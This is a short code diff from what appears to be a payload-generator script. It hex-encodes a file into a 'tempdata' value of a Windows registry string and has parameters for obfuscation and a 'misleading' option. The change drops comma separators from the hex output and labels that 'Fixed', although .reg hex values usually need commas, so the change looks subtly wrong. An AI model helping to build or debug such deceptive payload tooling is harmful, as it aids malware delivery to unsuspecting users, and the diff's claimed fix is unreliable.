@@ -68,8 +68,8 @@ def generate_payload(file_path, obfuscate, obf_length_kb, reg_filename, misleadi
 
     # Read the provided file and add its hex data to the registry as `tempdata`
     with open(file_path, 'rb') as f:
-        data = f.read().hex(",")
-    
+        data = f.read().hex()  # Fixed: No argument passed to hex()
+
     # Insert the hex-encoded payload into the registry string
     tempdata = '"tempdata"=hex:' + data
     payload += tempdata
